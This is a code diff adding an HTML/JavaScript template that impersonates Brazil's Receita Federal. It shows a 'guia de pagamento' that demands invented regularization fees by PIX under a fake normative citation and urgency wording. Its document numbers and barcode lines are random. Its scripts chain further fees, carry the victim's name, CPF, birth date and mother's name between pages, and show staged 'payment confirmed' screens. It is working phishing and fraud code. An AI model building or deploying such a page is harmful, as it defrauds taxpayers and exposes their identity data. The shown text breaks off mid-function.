@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vkfn3id661");
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guia de Pagamento - Receita Federal do Brasil</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons+Round" rel="stylesheet" />
+    <link rel="stylesheet" href="/static/rfb-header.css">
+    <style>
+        body { font-family: Arial, sans-serif; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .pulse-animation { animation: pulse 2s infinite; }
+        #btn-emitir-taxa:hover { background-color: #0C326F !important; }
+        .pix-code { word-break: break-all; font-size: 10px; line-height: 1.3; }
+        .dados-documento-card {
+            background: #FFFFFF;
+            border: 1px solid #c8cdd3;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.04);
+            max-width: 680px;
+            margin: 0 auto;
+            overflow: hidden;
+            position: relative;
+        }
+        .dados-documento-card::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 220px;
+            height: 220px;
+            background-image: url('/static/rfb-watermark.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.06;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .dados-documento-card > * {
+            position: relative;
+            z-index: 1;
+        }
+        .dados-documento-body {
+            padding: 20px 24px 18px;
+            text-align: center;
+        }
+        .dados-documento-brasao {
+            height: 68px;
+            margin: 0 auto 8px;
+            object-fit: contain;
+        }
+        .dados-documento-republica {
+            font-size: 13px;
+            font-weight: 700;
+            color: #071D41;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .dados-documento-normativa {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1351B4;
+            margin-bottom: 4px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .dados-documento-vigencia {
+            font-size: 12px;
+            color: #555d68;
+            font-weight: 500;
+            margin-bottom: 12px;
+            font-family: 'Inter', 'Rawline', sans-serif;
+        }
+        .dados-documento-dados {
+            padding: 16px 24px 18px;
+            border-top: 1px solid #dee2e6;
+        }
+        .dados-documento-dados-title {
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            color: #071D41;
+            margin-bottom: 12px;
+        }
+        .dados-documento-row {
+            display: flex;
+            flex-direction: row;
+            align-items: baseline;
+            gap: 8px;
+            padding: 5px 0;
+            font-family: 'Inter', 'Rawline', sans-serif;
+            font-size: 12px;
+        }
+        .dados-documento-row.row-stack {
+            flex-direction: column;
+            gap: 2px;
+        }
+        .dados-documento-label {
+            color: #555d68;
+            white-space: nowrap;
+        }
+        .dados-documento-value {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+        @media (min-width: 640px) {
+            .dados-documento-normativa {
+                font-size: 19px;
+            }
+            .dados-documento-body {
+                padding: 24px 40px 20px;
+            }
+            .dados-documento-dados {
+                padding: 18px 40px 22px;
+            }
+        }
+        @media (max-width: 768px) {
+            .pix-code {
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                max-width: 100%;
+            }
+        }
+        @media (max-width: 640px) {
+            .grid-dados-doc {
+                grid-template-columns: 1fr 1fr 1fr !important;
+                gap: 6px !important;
+            }
+            .grid-dados-periodo {
+                grid-template-columns: 1fr 1fr !important;
+                gap: 6px !important;
+            }
+            .checkout-card-header {
+                padding: 10px 12px 6px !important;
+            }
+            .checkout-card-header .header-inner {
+                gap: 8px !important;
+            }
+            .checkout-card-header .header-inner img {
+                height: 32px !important;
+            }
+            .checkout-card-header .header-title {
+                font-size: 12px !important;
+            }
+            .checkout-card-header .header-republic {
+                font-size: 9px !important;
+            }
+            .checkout-card-header .header-sub {
+                font-size: 8px !important;
+            }
+            .checkout-card-body {
+                padding: 8px 10px 10px !important;
+            }
+            .checkout-card-body .row-flex {
+                flex-direction: column !important;
+                gap: 2px !important;
+            }
+            .checkout-card-body .row-flex .row-right {
+                text-align: left !important;
+            }
+            .checkout-card-body .row-flex .uf-cep-group {
+                justify-content: flex-start !important;
+            }
+            .checkout-footer-row {
+                flex-direction: column !important;
+                gap: 4px !important;
+                align-items: flex-start !important;
+            }
+            .checkout-footer-row .footer-right {
+                text-align: left !important;
+            }
+            .pix-section-outer {
+                margin-top: 6px !important;
+            }
+            .info-banner {
+                padding: 10px 10px !important;
+                margin-top: 10px !important;
+            }
+        }
+        @media (max-width: 380px) {
+            .grid-dados-doc {
+                grid-template-columns: 1fr 1fr !important;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    {% include 'rfb_header.html' %}
+
+    <div class="px-4" style="background:#fff;">
+        <div class="max-w-2xl mx-auto py-3">
+            <nav style="display:flex;align-items:center;gap:6px;font-size:12px;font-family:'Inter','Rawline',sans-serif;white-space:nowrap;overflow-x:auto;scrollbar-width:none;">
+                <a href="/" style="color:#1351B4;"><i class="fas fa-home" style="font-size:12px;"></i></a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <a href="/" style="color:#1351B4;text-decoration:none;">Ministério da Fazenda</a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <a href="/" style="color:#1351B4;text-decoration:none;">Receita Federal do Brasil</a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <a href="/" style="color:#1351B4;text-decoration:none;">e-CAC</a>
+                <span style="color:#9E9D9D;font-size:10px;">&gt;</span>
+                <span style="color:#555d68;">Guia de Pagamento</span>
+            </nav>
+        </div>
+    </div>
+    <hr style="border:none;border-top:1px solid #e1e5eb;margin:0;">
+
+    <div id="popup-taxa" class="fixed inset-0 z-50" style="background: rgba(0,0,0,0.5); display: none; align-items: flex-start; justify-content: center; padding: 16px; overflow-y: auto; -webkit-overflow-scrolling: touch;">
+        <div style="background: #ffffff; max-width: 520px; width: 100%; border: 1px solid #c8cdd3; box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.04); animation: slideUp 0.25s ease-out; overflow: hidden; margin: 24px auto;">
+            <div style="background: #071D41; padding: 14px 20px; display: flex; align-items: center; gap: 10px;">
+                <img src="/static/logo-receita.png" alt="RFB" style="height: 22px; filter: brightness(10);">
+                <span style="color: #ffffff; font-weight: 600; font-size: 12px; letter-spacing: 0.5px; text-transform: uppercase; font-family: 'Inter', 'Rawline', sans-serif;">Receita Federal do Brasil</span>
+            </div>
+
+            <div style="padding: 0;">
+                <div style="padding: 20px 24px 0;">
+                    <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 16px;">
+                        <i class="fas fa-exclamation-circle" style="color: #E8970A; font-size: 18px; margin-top: 2px; flex-shrink: 0;"></i>
+                        <p style="font-size: 14px; font-weight: 700; color: #071D41; line-height: 1.4; font-family: 'Inter', 'Rawline', sans-serif; margin: 0;">
+                            Etapa pendente para conclusão da regularização
+                        </p>
+                    </div>
+                    <p style="font-size: 13px; color: #333; line-height: 1.7; font-family: 'Inter', 'Rawline', sans-serif; margin-bottom: 16px;">
+                        Para a emissão do comprovante definitivo de regularização do seu CPF, é necessário o recolhimento das taxas abaixo, conforme previsto na Instrução Normativa RFB nº 2.219/2025, Art. 12, §3º.
+                    </p>
+                </div>
+
+                <div style="margin: 0 24px 16px; background: #F8F9FA; border: 1px solid #DEE2E6; padding: 16px 20px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding-bottom: 8px; border-bottom: 1px solid #DEE2E6;">
+                        <span style="font-size: 11px; color: #555d68; font-family: 'Inter', 'Rawline', sans-serif; font-weight: 500; text-transform: uppercase; letter-spacing: 0.3px;">Descrição</span>
+                        <span style="font-size: 11px; color: #555d68; font-family: 'Inter', 'Rawline', sans-serif; font-weight: 500; text-transform: uppercase; letter-spacing: 0.3px;">Valor</span>
+                    </div>
+                    <div style="padding: 10px 0 8px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ECEEF1;">
+                        <span style="font-size: 13px; color: #071D41; font-family: 'Inter', 'Rawline', sans-serif; font-weight: 500;">Taxa Administrativa</span>
+                        <span style="font-size: 13px; font-weight: 600; color: #333; font-family: 'Inter', 'Rawline', sans-serif;">R$ 27,90</span>
+                    </div>
+                    <div style="padding: 8px 0 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #DEE2E6;">
+                        <span style="font-size: 13px; color: #071D41; font-family: 'Inter', 'Rawline', sans-serif; font-weight: 500;">Taxa de Consulta</span>
+                        <span style="font-size: 13px; font-weight: 600; color: #333; font-family: 'Inter', 'Rawline', sans-serif;">R$ 9,90</span>
+                    </div>
+                    <div style="padding: 10px 0 0; display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-size: 14px; color: #071D41; font-family: 'Inter', 'Rawline', sans-serif; font-weight: 700;">Total</span>
+                        <span style="font-size: 18px; font-weight: 700; color: #1351B4; font-family: 'Inter', 'Rawline', sans-serif;">R$ 37,80</span>
+                    </div>
+                    <p style="font-size: 11px; color: #888; margin-top: 8px; font-family: 'Inter', 'Rawline', sans-serif;">
+                        Vencimento: pagamento único — válido somente hoje
+                    </p>
+                </div>
+
+                <div style="margin: 0 24px 18px; background: #FFF8E6; border-left: 3px solid #E8970A; padding: 12px 16px;">
+                    <p style="font-size: 12px; color: #5C4A00; line-height: 1.6; font-family: 'Inter', 'Rawline', sans-serif; margin: 0;">
+                        Sem a quitação destas taxas, o comprovante de regularização não poderá ser emitido e as pendências permanecerão registradas nos sistemas da RFB.
+                    </p>
+                </div>
+
+                <div style="padding: 0 24px 20px;">
+                    <button id="btn-emitir-taxa" onclick="redirecionarParaTaxa()" style="width: 100%; padding: 14px; background-color: #1351B4; color: #ffffff; font-weight: 600; font-size: 14px; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; font-family: 'Inter', 'Rawline', sans-serif; transition: background-color 0.2s;">
+                        <i class="fas fa-barcode"></i>
+                        <span>Emitir Guia de Recolhimento</span>
+                    </button>
+                    <div style="margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 6px;">
+                        <i class="fas fa-lock" style="font-size: 10px; color: #888;"></i>
+                        <p style="font-size: 10px; color: #888; font-family: 'Inter', 'Rawline', sans-serif; margin: 0;">
+                            Proc. <span style="letter-spacing: 0.3px;">28.1748320184-9284.03</span>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    {% include 'global_loader.html' %}
+
+    <div id="popup-loading-taxa" class="rfb-loader-overlay">
+        <img src="/static/logo-receita.png" alt="Receita Federal">
+        <p class="rfb-loader-text">Processando solicitação...</p>
+        <div class="rfb-loader-track"><div class="rfb-loader-bar"></div></div>
+        <div class="rfb-loader-percent">0%</div>
+    </div>
+
+    <div id="popup-verificando" class="rfb-loader-overlay">
+        <img src="/static/logo-receita.png" alt="Receita Federal">
+        <p class="rfb-loader-text">Verificando seu pagamento...</p>
+        <div class="rfb-loader-track"><div class="rfb-loader-bar"></div></div>
+        <div class="rfb-loader-percent">0%</div>
+    </div>
+    
+    <div style="font-family: Arial, sans-serif; background-color: #F8F8F8; padding: 8px; flex: 1; margin-top: 0;">
+        <div style="max-width: 680px; margin: 0 auto; padding: 0 4px;">
+
+            <div class="dados-documento-card">
+                <div class="checkout-card-header" style="padding: 12px 20px 8px; text-align: center; border-bottom: 1px solid #e1e5eb;">
+                    <div class="header-inner" style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 4px;">
+                        <img src="/static/brasao-republica.png" alt="Brasão" style="height: 38px; object-fit: contain;">
+                        <div style="text-align: left;">
+                            <p class="header-republic" style="font-size: 10px; font-weight: 700; color: #071D41; text-transform: uppercase; letter-spacing: 0.3px; margin: 0; font-family: 'Inter', 'Rawline', sans-serif;">República Federativa do Brasil</p>
+                            <p class="header-title" style="font-size: 14px; font-weight: 700; color: #1351B4; margin: 0; font-family: 'Inter', 'Rawline', sans-serif;">Guia de Regularização Tributária</p>
+                            <p class="header-sub" style="font-size: 9px; color: #555d68; margin: 0; font-family: 'Inter', 'Rawline', sans-serif;">Secretaria da Receita Federal do Brasil</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="checkout-card-body" style="padding: 10px 16px 12px; font-family: 'Inter', 'Rawline', sans-serif;">
+                    <div class="row-flex" style="display: flex; justify-content: space-between; padding: 4px 0;">
+                        <div>
+                            <span style="color: #555d68; font-size: 9px;">Beneficiário</span>
+                            <div style="font-size: 11px; color: #1a1a1a; font-weight: 600;">Secretaria da Receita Federal do Brasil</div>
+                        </div>
+                        <div class="row-right" style="text-align: right;">
+                            <span style="color: #555d68; font-size: 9px;">CNPJ</span>
+                            <div style="font-size: 11px; color: #1a1a1a; font-weight: 600;">00.394.460/0001-41</div>
+                        </div>
+                    </div>
+                    <div class="row-flex" style="display: flex; justify-content: space-between; padding: 4px 0;">
+                        <div>
+                            <span style="color: #555d68; font-size: 9px;">Pagador</span>
+                            <div style="font-size: 11px; color: #1a1a1a; font-weight: 600;" id="nome-pagador">{{ nome }}</div>
+                        </div>
+                        <div class="row-right" style="text-align: right;">
+                            <span style="color: #555d68; font-size: 9px;">CPF</span>
+                            <div style="font-size: 11px; color: #1a1a1a; font-weight: 600;" id="cpf-pagador">{{ cpf }}</div>
+                        </div>
+                    </div>
+                    <div style="padding: 4px 0;">
+                        <span style="color: #555d68; font-size: 9px;">Instruções</span>
+                        <div style="font-size: 10px; line-height: 1.4; margin-top: 1px;">
+                            <span style="font-weight: 700; color: #C5190A;">NÃO RECEBER APÓS VENCIMENTO</span><br>
+                            <span style="color: #333;">Regularização de pendência tributária conforme IN RFB nº 2.219/2025</span><br>
+                            <span style="color: #333;">Processo: 28.1748320184-9284.03 | Protocolo: <span id="guia-numero"></span></span>
+                        </div>
+                    </div>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr 1.5fr 0.5fr 0.5fr 0.5fr; gap: 4px; padding: 5px 0; font-size: 10px;" class="grid-dados-doc">
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Data Documento</span>
+                            <div style="color: #1a1a1a; font-weight: 600;" id="data-documento"></div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Dt. Processamento</span>
+                            <div style="color: #1a1a1a; font-weight: 600;" id="data-processamento"></div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Num. Documento</span>
+                            <div style="color: #1a1a1a; font-weight: 600;" id="numero-documento"></div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Aceite</span>
+                            <div style="color: #1a1a1a; font-weight: 600;">S</div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Código</span>
+                            <div style="color: #1a1a1a; font-weight: 600;">0190</div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Espécie</span>
+                            <div style="color: #1a1a1a; font-weight: 600;">R$</div>
+                        </div>
+                    </div>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 4px; padding: 5px 0; font-size: 10px;" class="grid-dados-periodo">
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Período Apuração</span>
+                            <div style="color: #1a1a1a; font-weight: 600;">01/2025 a 12/2025</div>
+                        </div>
+                        <div>
+                            <span style="color: #555d68; font-size: 8px;">Nosso Número</span>
+                            <div style="color: #1a1a1a; font-weight: 600;" id="nosso-numero"></div>
+                        </div>
+                        <div style="text-align: right;">
+                            <span style="color: #555d68; font-size: 8px;">Valor do Documento</span>
+                            <div style="font-size: 14px; font-weight: 700; color: #071D41;">R$ {{ valor }}</div>
+                        </div>
+                        <div style="text-align: right;">
+                            <span style="color: #555d68; font-size: 8px;">Vencimento</span>
+                            <div style="font-size: 14px; font-weight: 700; color: #C5190A;" id="data-vencimento"></div>
+                        </div>
+                    </div>
+                    <div style="padding-top: 6px; margin-top: 4px; border-top: 1px solid #e1e5eb; font-size: 9px; color: #888; line-height: 1.6; text-align: center;">
+                        <div>e-CAC: cav.receita.fazenda.gov.br</div>
+                        <div>Autenticação Mecânica - Recibo do Pagador</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pix-section-outer" style="max-width: 680px; margin: 8px auto 0 auto; background-color: white; border-top: 2px dashed #999; position: relative;">
+                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 180px; height: 180px; background-image: url('/static/rfb-watermark.png'); background-size: contain; background-repeat: no-repeat; background-position: center; opacity: 0.04; pointer-events: none; z-index: 0;"></div>
+                <div class="flex border-b border-black">
+                    <div class="flex items-center justify-center w-[60px] sm:w-[80px] md:w-[110px] h-[40px] sm:h-[50px] md:h-[70px] border-r border-black overflow-hidden" style="background-color: #1351B4;">
+                        <img alt="Logo Receita" src="/static/logo-receita.png" style="object-fit: contain; width: 40px; height: 28px; filter: brightness(0) invert(1);">
+                    </div>
+                    <div class="flex items-center justify-center w-[45px] sm:w-[60px] md:w-[90px] h-[40px] sm:h-[50px] md:h-[70px] border-r border-black">
+                        <span class="text-xs sm:text-xl md:text-3xl font-bold" style="letter-spacing: -0.5px;">001-9</span>
+                    </div>
+                    <div class="flex-1 flex items-center px-1.5 sm:px-3 md:px-4 h-[40px] sm:h-[50px] md:h-[70px] justify-end overflow-hidden">
+                        <span class="text-[8px] sm:text-xs md:text-lg font-bold tracking-wider text-right" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" id="linha-digitavel"></span>
+                    </div>
+                </div>
+
+                <div class="flex border-b border-black">
+                    <div class="w-[75%] border-r border-black p-1 sm:p-1.5 md:p-2">
+                        <div class="text-[9px] sm:text-xs md:text-xs leading-3">Local de Pagamento</div>
+                        <div class="font-bold text-[9px] sm:text-xs md:text-base">PAGÁVEL VIA PIX ATÉ O VENCIMENTO</div>
+                    </div>
+                    <div class="w-[25%] p-1 sm:p-1.5 md:p-2">
+                        <div class="text-[9px] sm:text-xs md:text-xs leading-3">Vencimento</div>
+                        <div class="font-bold text-[9px] sm:text-xs md:text-base text-center" id="data-vencimento-2"></div>
+                    </div>
+                </div>
+
+                <div style="padding: 10px;">
+                    <div style="text-align: center; margin-bottom: 10px;">
+                        <h3 style="font-size: 13px; font-weight: bold; color: #1351B4; margin-bottom: 4px;">PAGAMENTO VIA PIX</h3>
+                        <p style="font-size: 10px; color: #666;">Escaneie o QR Code ou copie o código PIX</p>
+                    </div>
+
+                    <div style="display: flex; justify-content: center; margin-bottom: 10px;">
+                        <div id="qrcode-container" style="background: white; padding: 6px; border: 1px solid #ddd;">
+                            <div style="width: 150px; height: 150px; display: flex; align-items: center; justify-content: center;">
+                                <div class="animate-spin rounded-full h-8 w-8 border-4 border-gray-300" style="border-top-color: #1351B4;"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="background: #f5f5f5; padding: 8px; margin-bottom: 10px;">
+                        <div style="font-size: 9px; color: #777; margin-bottom: 3px; text-align: center;">Código PIX Copia e Cola</div>
+                        <div style="background: white; border: 1px solid #ddd; padding: 6px; margin-bottom: 6px; word-wrap: break-word; overflow-wrap: break-word;">
+                            <p id="pix-code" class="pix-code" style="color: #333; text-align: center;">Gerando código PIX...</p>
+                        </div>
+                        <button id="copy-btn" onclick="copyPixCode()" style="width: 100%; padding: 10px; background-color: #1351B4; color: white; font-weight: bold; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px;">
+                            <i class="fas fa-copy"></i>
+                            <span>Copiar Código PIX</span>
+                        </button>
+                        <div id="confirmar-section" style="display: none; margin-top: 8px;">
+                            <p style="font-size: 10px; color: #333; font-family: 'Inter', sans-serif; text-align: center; margin-bottom: 6px; line-height: 1.4;">
+                                Após confirmar o pagamento no seu aplicativo bancário, clique no botão abaixo para emitir o comprovante de regularização.
+                            </p>
+                            <button id="btn-comprovante" onclick="emitirComprovante()" style="width: 100%; padding: 10px; background-color: #168821; color: white; font-weight: 600; font-size: 12px; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; font-family: 'Inter', sans-serif;">
+                                <i class="fas fa-file-alt"></i>
+                                <span>Emitir Comprovante de Pagamento</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div id="status-container" style="display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 10px; color: #666; margin-bottom: 10px; flex-wrap: wrap;">
+                        <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%;" class="pulse-animation"></div>
+                        <span>Aguardando confirmação do pagamento...</span>
+                    </div>
+
+                    <div style="border-top: 1px solid #ddd; padding-top: 8px; text-align: center;">
+                        <p style="font-size: 9px; color: #777; margin-bottom: 2px;">Beneficiário</p>
+                        <p style="font-size: 10px; font-weight: bold; color: #333;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</p>
+                        <p style="font-size: 9px; color: #666;">CNPJ: 00.394.460/0001-41</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    {% include 'rfb_footer.html' %}
+
+    <script>
+        const nome = "{{ nome }}";
+        const cpf = "{{ cpf }}";
+        const valor = "{{ valor }}";
+        const cpfLimpo = String(cpf).replace(/\D/g, '');
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const level = parseInt(urlParams.get('level') || '1');
+        let transactionId = null;
+        let pixCode = '';
+        let statusCheckInterval = null;
+        let pixCopiado = false;
+        let pagamentoConfirmado = false;
+
+        let STORAGE_KEY = '';
+        let PAID_KEY = '';
+
+        function formatCPF(cpf) {
+            const cpfClean = String(cpf).replace(/\D/g, '');
+            if (cpfClean.length === 11) {
+                return cpfClean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            }
+            return cpf;
+        }
+
+        function getDataHoje() {
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            return `${dia}/${mes}/${ano}`;
+        }
+
+        function getNumeroDocumento() {
+            const r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
+            const r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
+            return `${r1}/${r2}-8`;
+        }
+
+        function getNossoNumero() {
+            const r1 = Math.floor(Math.random() * 999).toString().padStart(3, '0');
+            const r2 = Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
+            return `${r1}/${r2}-4`;
+        }
+
+        function getGuiaNumero() {
+            const r1 = Math.floor(Math.random() * 9999999).toString().padStart(7, '0');
+            const r2 = Math.floor(Math.random() * 99).toString().padStart(2, '0');
+            return `${r1}-${r2}/${r2}`;
+        }
+
+        function getLinhaDigitavel() {
+            const p1 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+            const p2 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+            const p3 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+            const p4 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+            const p5 = Math.floor(Math.random() * 99999).toString().padStart(5, '0');
+            const p6 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
+            return `00190.${p1} ${p2}.${p3} ${p4}.${p5} 1 ${p6}14794`;
+        }
+
+        function copyPixCode() {
+            const pixCodeText = document.getElementById('pix-code').textContent;
+            navigator.clipboard.writeText(pixCodeText).then(() => {
+                const btn = document.getElementById('copy-btn');
+                btn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+                btn.style.backgroundColor = '#059669';
+                
+                pixCopiado = true;
+                localStorage.setItem(STORAGE_KEY, 'true');
+                
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fas fa-copy"></i> <span>Copiar Código PIX</span>';
+                    btn.style.backgroundColor = '#1351B4';
+                }, 2000);
+            });
+        }
+
+        function mostrarPopupTaxa() {
+            document.getElementById('popup-taxa').style.display = 'flex';
+        }
+
+        function emitirComprovante() {
+            var btn = document.getElementById('btn-comprovante');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Verificando pagamento...</span>';
+            btn.style.opacity = '0.85';
+            btn.style.pointerEvents = 'none';
+            
+            if (level === 2) {
+                setTimeout(function() {
+                    btn.innerHTML = '<i class="fas fa-file-alt"></i> <span>Emitir Comprovante de Pagamento</span>';
+                    btn.style.opacity = '1';
+                    btn.style.pointerEvents = 'auto';
+                    mostrarPopupTaxa();
+                }, 1200);
+            } else {
+                setTimeout(function() {
+                    redirecionarParaSegundaTaxa();
+                }, 1000);
+            }
+        }
+
+        function redirecionarParaTaxa() {
+            var btnTaxa = document.getElementById('btn-emitir-taxa');
+            btnTaxa.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Processando...</span>';
+            btnTaxa.style.opacity = '0.85';
+            btnTaxa.style.pointerEvents = 'none';
+
+            const nascimento = urlParams.get('nascimento') || '';
+            const mae = urlParams.get('mae') || '';
+            const nomeEnc = encodeURIComponent(nome);
+            const cpfEnc = encodeURIComponent(cpfLimpo);
+            const nascEnc = encodeURIComponent(nascimento);
+            const maeEnc = encodeURIComponent(mae);
+
+            setTimeout(function() {
+                document.getElementById('popup-taxa').style.display = 'none';
+                rfbTransition('popup-loading-taxa', 'Processando solicitação...', [
+                    { at: 50, text: 'Gerando guia de recolhimento...' },
+                    { at: 90, text: 'Guia gerada com sucesso', color: '#168821' }
+                ], 2000, '/checkout?nome=' + nomeEnc + '&cpf=' + cpfEnc + '&valor=37.80&level=3&nascimento=' + nascEnc + '&mae=' + maeEnc);
+            }, 600);
+        }
+
+        function exibirPix(codigo, qrBase64, qrUrl) {
+            document.getElementById('pix-code').textContent = codigo;
+            
+            const qrContainer = document.getElementById('qrcode-container');
+            var qrSrc = '';
+            if (qrBase64) {
+                qrSrc = 'data:image/png;base64,' + qrBase64;
+            } else if (qrUrl) {
+                qrSrc = qrUrl;
+            } else {
+                qrSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(codigo);
+            }
+            qrContainer.innerHTML = '<img src="' + qrSrc + '" alt="QR Code PIX" style="width: 160px; height: 160px;">';
+            
+            iniciarVerificacaoStatus();
+        }
+
+        function mostrarPopupVerificando() {
+            rfbShowLoader('popup-verificando', 'Verificando seu pagamento...');
+        }
+
+        function esconderPopupVerificando() {
+            var el = document.getElementById('popup-verificando');
+            if (el) el.style.display = 'none';
+        }
+
+        function redirecionarParaSegundaTaxa() {
+            const nascimento = urlParams.get('nascimento') || '';
+            const mae = urlParams.get('mae') || '';
+            const nomeEnc = encodeURIComponent(nome);
+            const cpfEnc = encodeURIComponent(cpfLimpo);
+            const nascEnc = encodeURIComponent(nascimento);
+            const maeEnc = encodeURIComponent(mae);
+
+            var destino;
+            if (level === 3) {
+                destino = '/conclusao?nome=' + nomeEnc + '&cpf=' + cpfEnc;
+            } else {
+                destino = '/extrato2?nome=' + nomeEnc + '&cpf=' + cpfEnc + '&nascimento=' + nascEnc + '&mae=' + maeEnc;
+            }
+            
+            rfbTransition('popup-verificando', 'Verificando seu pagamento...', [
+                { at: 40, text: 'Confirmando pagamento...' },
+                { at: 70, text: 'Registrando no sistema...' },
+                { at: 95, text: 'Pagamento confirmado!', color: '#168821' }
+            ], 3000, destino);
+        }
+
+        function mostrarPagamentoConfirmado() {
+            const statusDiv = document.getElementById('status-container');
+            statusDiv.innerHTML = `
+                <div style="width: 12px; height: 12px; background: #22c55e; border-radius: 50%;"></div>
+                <span style="color: #22c55e; font-weight: bold;">Pagamento confirmado!</span>
+            `;
+            
+            pagamentoConfirmado = true;
+            localStorage.setItem(PAID_KEY, 'true');
+            
+            esconderPopupVerificando();
+            
+            if (level === 2) {
+                setTimeout(mostrarPopupTaxa, 1500);
+            } else {
+                setTimeout(redirecionarParaSegundaTaxa, 1500);
+            }
+        }
+
+        async function verificarStatusUmaVez() {
+            if (!transactionId) return null;
+            
+            try {
+                const response = await fetch(`/api/pix/status/${transactionId}`);
+                const result = await response.json();
+                
+                if (result.success) {
+                    return result.status;
+                }
+            } catch (error) {
+                console.error('Erro ao verificar status:', error);
+            }
+            return null;
+        }
+
+        function iniciarVerificacaoStatus() {
+            if (!transactionId) return;
+            
+            statusCheckInterval = setInterval(async () => {
+                const status = await verificarStatusUmaVez();
+                
+                if (status === 'PAID' || status === 'paid' || status === 'completed' || status === 'approved') {
+                    clearInterval(statusCheckInterval);
+                    mostrarPagamentoConfirmado();
+                }
+            }, 5000);
+        }
+
+        async function verificarAoRetornar() {
+            const jaCopiou = localStorage.getItem(STORAGE_KEY) === 'true';
+            const jaPagou = localStorage.getItem(PAID_KEY) === 'true';
+            
+            if (jaPagou) {
+                if (level === 2) {
+                    mostrarPopupTaxa();
+                } else {
+                    redirecionarParaSegundaTaxa();
+                }
+                return;
+            }
+            
